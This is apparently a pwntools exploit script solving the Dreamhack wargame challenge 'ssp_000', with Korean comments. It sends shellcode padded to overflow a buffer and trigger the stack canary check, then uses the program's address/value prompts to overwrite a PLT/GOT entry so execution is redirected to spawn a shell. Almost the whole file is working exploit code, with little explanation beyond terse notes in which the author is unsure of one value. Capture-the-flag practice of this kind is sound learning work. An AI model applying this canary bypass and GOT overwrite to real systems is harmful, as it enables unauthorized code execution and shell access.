from pwn import *
import os

def slog(n, m): return success(": ".join([n, hex(m)]))

p = process("./ssp_000")
#p = remote('host1.dreamhack.games', 12448)

context.arch="amd64"

#gdb.attach(p)
#raw_input()

sh = asm(shellcraft.sh())
payload = sh.ljust(0x80, b"A")
#1234567812345678123456781234567812345678123456781234567812345678
p.sendline(payload)
#stack canary 실패하기
p.recvuntil("Addr : ")
p.sendline(b"\x00\x00\x00\x00\x00\x40\x06\xD0"[::-1])
#plt주소 입력
p.recvuntil("Value : ")
p.sendline(b"\xE8\xBC\xF7\x3F\x00"[::-1])
#get_shell함수 주소 입력이 아니라, call 0x4008EA명령어를 입력?

p.interactive()